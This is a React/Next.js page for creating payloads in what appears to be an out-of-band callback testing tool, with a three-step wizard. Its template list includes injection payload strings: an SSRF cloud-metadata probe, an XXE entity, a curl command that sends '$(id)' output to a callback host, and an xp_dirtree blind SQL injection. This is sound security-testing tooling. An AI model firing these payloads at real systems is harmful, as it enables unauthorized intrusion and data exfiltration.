'use client'

import { useState, useEffect } from 'react'
import { useRouter, useSearchParams } from 'next/navigation'
import { payloadApi, caseApi } from '@/lib/api-client'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { cn } from '@/lib/utils'

/** Available payload templates per design spec */
const TEMPLATES = [
  {
    id: 'ssrf_http',
    label: 'SSRF HTTP',
    description: 'Server-Side Request Forgery via HTTP',
    preview: 'http://{{.token}}.{{.domain}}/{{.path}}',
    category: 'SSRF',
  },
  {
    id: 'ssrf_cloud',
    label: 'SSRF Cloud',
    description: 'Cloud metadata endpoint probe',
    preview: 'http://169.254.169.254/latest/meta-data/?x={{.token}}.{{.domain}}',
    category: 'SSRF',
  },
  {
    id: 'xxe_external',
    label: 'XXE External',
    description: 'XML External Entity injection',
    preview: '<!ENTITY % ext SYSTEM "http://{{.token}}.{{.domain}}">',
    category: 'XXE',
  },
  {
    id: 'rce_curl',
    label: 'RCE curl',
    description: 'Remote Code Execution via curl',
    preview: 'curl http://{{.token}}.{{.domain}}/$(id)',
    category: 'RCE',
  },
  {
    id: 'blind_sqli',
    label: 'Blind SQLi',
    description: 'DNS-based blind SQL injection',
    preview: "'; EXEC master..xp_dirtree '//{{.token}}.{{.domain}}/x'--",
    category: 'SQLi',
  },
  {
    id: 'ssti',
    label: 'SSTI',
    description: 'Server-Side Template Injection',
    preview: '{{7*7}}.{{.token}}.{{.domain}}',
    category: 'SSTI',
  },
  {
    id: 'smtp',
    label: 'SMTP Injection',
    description: 'SMTP header / recipient injection',
    preview: 'From: test@{{.token}}.{{.domain}}',
    category: 'SMTP',
  },
  {
    id: 'deserialization',
    label: 'Deserialization',
    description: 'Java/PHP object deserialization',
    preview: '...callback to {{.token}}.{{.domain}}...',
    category: 'Deserial',
  },
]

/** Step indicator bar */
function StepIndicator({ current, total }: { current: number; total: number }) {
  return (
    <div className="flex items-center gap-0 mb-8">
      {Array.from({ length: total }).map((_, i) => {
        const stepNum = i + 1
        const done = stepNum < current
        const active = stepNum === current
        return (
          <div key={i} className="flex items-center">
            <div
              className={cn(
                'w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold transition-colors',
                done
                  ? 'bg-indigo-600 text-white'
                  : active
                  ? 'bg-indigo-600 text-white ring-4 ring-indigo-100'
                  : 'bg-gray-200 text-gray-500 dark:bg-gray-700 dark:text-gray-400'
              )}
            >
              {done ? '✓' : stepNum}
            </div>
            {i < total - 1 && (
              <div
                className={cn(
                  'h-0.5 w-16 sm:w-24 transition-colors',
                  done ? 'bg-indigo-600' : 'bg-gray-200 dark:bg-gray-700'
                )}
              />
            )}
          </div>
        )
      })}
    </div>
  )
}

/** Step 1: choose a template */
function StepTemplate({
  selected,
  onSelect,
}: {
  selected: string
  onSelect: (id: string) => void
}) {
  const categories = Array.from(new Set(TEMPLATES.map((t) => t.category)))

  return (
    <div>
      <h3 className="text-lg font-semibold text-gray-900 dark:text-gray-100 mb-1">
        Choose a template
      </h3>
      <p className="text-sm text-gray-500 dark:text-gray-400 mb-6">
        Select the payload type that matches your test scenario.
      </p>
      <div className="space-y-6">
        {categories.map((cat) => (
          <div key={cat}>
            <p className="text-xs font-semibold uppercase tracking-widest text-gray-400 mb-2">{cat}</p>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              {TEMPLATES.filter((t) => t.category === cat).map((tmpl) => (
                <button
                  key={tmpl.id}
                  type="button"
                  onClick={() => onSelect(tmpl.id)}
                  className={cn(
                    'text-left p-4 rounded-lg border-2 transition-all',
                    selected === tmpl.id
                      ? 'border-indigo-600 bg-indigo-50 dark:bg-indigo-900/20 dark:border-indigo-400'
                      : 'border-gray-200 hover:border-indigo-300 dark:border-gray-700 dark:hover:border-indigo-700 dark:bg-gray-800'
                  )}
                >
                  <p className="font-semibold text-sm text-gray-900 dark:text-gray-100">{tmpl.label}</p>
                  <p className="text-xs text-gray-500 dark:text-gray-400 mt-0.5">{tmpl.description}</p>
                  <code className="block mt-2 text-xs text-indigo-600 dark:text-indigo-400 bg-indigo-50/50 dark:bg-indigo-900/10 rounded px-2 py-1 font-mono truncate">
                    {tmpl.preview}
                  </code>
                </button>
              ))}
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}

/** Step 2: configure variables */
function StepVariables({
  vars,
  caseId,
  cases,
  expiresIn,
  onChange,
}: {
  vars: Record<string, string>
  caseId: string
  cases: Array<{ id: string; title: string }>
  expiresIn: number
  onChange: (field: string, value: string | number) => void
}) {
  return (
    <div>
      <h3 className="text-lg font-semibold text-gray-900 dark:text-gray-100 mb-1">
        Configure variables
      </h3>
      <p className="text-sm text-gray-500 dark:text-gray-400 mb-6">
        Fill in template variables and associate with a case.
      </p>
      <div className="space-y-4 max-w-lg">
        {/* Token is auto-generated, display only */}
        <div>
          <Label className="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">
            Token (auto-generated)
          </Label>
          <div className="flex items-center gap-2 mt-1">
            <Input
              disabled
              value={vars.token || 'gdl_xxxxxxxx'}
              className="font-mono text-sm bg-gray-50 dark:bg-gray-900"
            />
            <span className="text-xs text-gray-400 whitespace-nowrap">auto</span>
          </div>
        </div>

        {/* Scenario / description */}
        <div>
          <Label htmlFor="scenario" className="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">
            Scenario (optional)
          </Label>
          <Input
            id="scenario"
            className="mt-1"
            placeholder="e.g. SSRF via PDF renderer"
            value={vars.scenario || ''}
            onChange={(e) => onChange('scenario', e.target.value)}
          />
        </div>

        {/* Associate case */}
        <div>
          <Label htmlFor="case" className="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">
            Associate Case (optional)
          </Label>
          <select
            id="case"
            className="mt-1 w-full px-3 py-2 text-sm border border-gray-300 rounded-md dark:border-gray-700 dark:bg-gray-800 dark:text-gray-100 focus:outline-none focus:ring-2 focus:ring-indigo-500"
            value={caseId}
            onChange={(e) => onChange('case_id', e.target.value)}
          >
            <option value="">— No case —</option>
            {cases.map((c) => (
              <option key={c.id} value={c.id}>
                {c.title}
              </option>
            ))}
          </select>
        </div>

        {/* Expiry */}
        <div>
          <Label htmlFor="expires" className="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">
            Expiry (seconds)
          </Label>
          <div className="flex items-center gap-3 mt-1">
            <Input
              id="expires"
              type="number"
              className="w-40"
              min={60}
              max={2592000}
              value={expiresIn}
              onChange={(e) => onChange('expires_in', parseInt(e.target.value) || 3600)}
            />
            <span className="text-xs text-gray-400">
              {expiresIn >= 86400
                ? `${Math.round(expiresIn / 86400)} day(s)`
                : `${Math.round(expiresIn / 3600)} hour(s)`}
            </span>
          </div>
          <div className="flex gap-2 mt-2">
            {[
              { label: '1h', value: 3600 },
              { label: '24h', value: 86400 },
              { label: '7d', value: 604800 },
              { label: '30d', value: 2592000 },
            ].map((preset) => (
              <button
                key={preset.value}
                type="button"
                onClick={() => onChange('expires_in', preset.value)}
                className={cn(
                  'px-2 py-1 text-xs rounded border transition-colors',
                  expiresIn === preset.value
                    ? 'bg-indigo-600 text-white border-indigo-600'
                    : 'border-gray-300 text-gray-500 hover:border-indigo-400 dark:border-gray-600 dark:text-gray-400'
                )}
              >
                {preset.label}
              </button>
            ))}
          </div>
        </div>
      </div>
    </div>
  )
}

/** Step 3: preview and confirm */
function StepPreview({
  templateId,
  vars,
  caseId,
  cases,
  expiresIn,
}: {
  templateId: string
  vars: Record<string, string>
  caseId: string
  cases: Array<{ id: string; title: string }>
  expiresIn: number
}) {
  const tmpl = TEMPLATES.find((t) => t.id === templateId)
  const selectedCase = cases.find((c) => c.id === caseId)
  const sampleToken = 'gdl_abc123'
  const previewFilled = (tmpl?.preview || '')
    .replace('{{.token}}', sampleToken)
    .replace('{{.domain}}', 'user1.example.com')
    .replace('{{.path}}', vars.scenario || 'test')

  return (
    <div>
      <h3 className="text-lg font-semibold text-gray-900 dark:text-gray-100 mb-1">
        Preview &amp; confirm
      </h3>
      <p className="text-sm text-gray-500 dark:text-gray-400 mb-6">
        Review the payload details before creating.
      </p>

      <div className="space-y-4 max-w-lg">
        <Card className="dark:bg-gray-800 dark:border-gray-700">
          <CardContent className="p-4 space-y-3">
            <div>
              <p className="text-xs font-medium text-gray-500 uppercase tracking-wide">Template</p>
              <p className="text-sm font-semibold text-gray-900 dark:text-gray-100 mt-0.5">
                {tmpl?.label ?? templateId}
              </p>
            </div>
            <div>
              <p className="text-xs font-medium text-gray-500 uppercase tracking-wide">Preview (sample token)</p>
              <code className="block mt-1 text-sm font-mono text-indigo-600 dark:text-indigo-400 bg-indigo-50 dark:bg-indigo-900/20 rounded px-3 py-2 break-all">
                {previewFilled}
              </code>
            </div>
            {selectedCase && (
              <div>
                <p className="text-xs font-medium text-gray-500 uppercase tracking-wide">Associated Case</p>
                <p className="text-sm text-gray-700 dark:text-gray-300 mt-0.5">{selectedCase.title}</p>
              </div>
            )}
            <div>
              <p className="text-xs font-medium text-gray-500 uppercase tracking-wide">Expiry</p>
              <p className="text-sm text-gray-700 dark:text-gray-300 mt-0.5">
                {expiresIn >= 86400
                  ? `${Math.round(expiresIn / 86400)} day(s)`
                  : `${Math.round(expiresIn / 3600)} hour(s)`}
              </p>
            </div>
            {vars.scenario && (
              <div>
                <p className="text-xs font-medium text-gray-500 uppercase tracking-wide">Scenario</p>
                <p className="text-sm text-gray-700 dark:text-gray-300 mt-0.5">{vars.scenario}</p>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  )
}

/** Multi-step Payload creation wizard */
export default function NewPayloadPage() {
  const router = useRouter()
  const searchParams = useSearchParams()
  const presetCaseId = searchParams.get('case_id') || ''
  const [step, setStep] = useState(1)
  const [loading, setLoading] = useState(false)
  const [cases, setCases] = useState<Array<{ id: string; title: string }>>([])
  const [selectedCase, setSelectedCase] = useState<{ id: string; title: string } | null>(null)
  const [formData, setFormData] = useState({
    template: 'ssrf_http',
    scenario: '',
    case_id: presetCaseId,
    expires_in: 86400,
  })
  const [vars, setVars] = useState<Record<string, string>>({ token: 'gdl_xxxxxxxx' })

  useEffect(() => {
    caseApi
      .list({ page: 1, page_size: 100 })
      .then((r) => {
        const caseList = (r.data?.items || []).map((c) => ({ id: c.id, title: c.title }))
        setCases(caseList)
        if (presetCaseId) {
          const found = caseList.find((c) => c.id === presetCaseId)
          if (found) setSelectedCase(found)
        }
      })
      .catch((e) => console.error('Failed to load cases:', e))
  }, [presetCaseId])

  const handleFieldChange = (field: string, value: string | number) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
    if (field === 'case_id') {
      const found = cases.find((c) => c.id === value)
      setSelectedCase(found || null)
    }
  }

  const handleVarChange = (field: string, value: string) => {
    setVars((prev) => ({ ...prev, [field]: value }))
    if (field === 'scenario') handleFieldChange('scenario', value)
  }

  const handleSubmit = async () => {
    setLoading(true)
    try {
      // Convert seconds-from-now to ISO timestamp
      const expiresAt = new Date(Date.now() + formData.expires_in * 1000).toISOString()

      const createReq: import('@/types').PayloadCreateRequest = {
        case_id: formData.case_id || '',
        template: formData.template,
        expires_at: expiresAt,
        variables: formData.scenario ? { scenario: formData.scenario } : undefined,
      }

      const response = await payloadApi.create(createReq)
      const payloadData = response.data && 'data' in response.data
        ? (response.data as { data: import('@/types').Payload }).data
        : (response.data as unknown as import('@/types').Payload)

      if (payloadData?.id) {
        router.push(`/dashboard/payloads/${payloadData.id}`)
        return
      }
      router.push('/dashboard/payloads')
    } catch (err) {
      console.error('Failed to create payload:', err)
      alert('Failed to create payload')
    } finally {
      setLoading(false)
    }
  }

  const canProceed = step === 1 ? !!formData.template : true

  return (
    <div className="max-w-3xl mx-auto">
      <div className="flex items-center gap-2 mb-6">
        <button
          onClick={() => router.back()}
          className="text-indigo-600 hover:text-indigo-800 dark:text-indigo-400 text-sm flex items-center gap-1"
        >
          ← Back
        </button>
      </div>

      <Card className="dark:bg-gray-800 dark:border-gray-700">
        <CardHeader>
          <CardTitle className="text-lg">New Payload</CardTitle>
          {selectedCase && (
            <p className="text-sm text-gray-500 dark:text-gray-400">
              Creating for Case: <span className="font-medium text-indigo-600 dark:text-indigo-400">{selectedCase.title}</span>
            </p>
          )}
        </CardHeader>
        <CardContent>
          <StepIndicator current={step} total={3} />

          {step === 1 && (
            <StepTemplate
              selected={formData.template}
              onSelect={(id) => handleFieldChange('template', id)}
            />
          )}

          {step === 2 && (
            <StepVariables
              vars={vars}
              caseId={formData.case_id}
              cases={cases}
              expiresIn={formData.expires_in}
              onChange={(field, value) => {
                if (field === 'scenario') handleVarChange('scenario', String(value))
                else handleFieldChange(field, value)
              }}
            />
          )}

          {step === 3 && (
            <StepPreview
              templateId={formData.template}
              vars={vars}
              caseId={formData.case_id}
              cases={cases}
              expiresIn={formData.expires_in}
            />
          )}

          {/* Navigation */}
          <div className="flex justify-between mt-8 pt-6 border-t border-gray-200 dark:border-gray-700">
            <Button
              variant="outline"
              onClick={() => (step > 1 ? setStep(step - 1) : router.back())}
            >
              {step === 1 ? 'Cancel' : 'Back'}
            </Button>
            {step < 3 ? (
              <Button onClick={() => setStep(step + 1)} disabled={!canProceed}>
                Next →
              </Button>
            ) : (
              <Button onClick={handleSubmit} disabled={loading}>
                {loading ? 'Creating...' : 'Create Payload'}
              </Button>
            )}
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
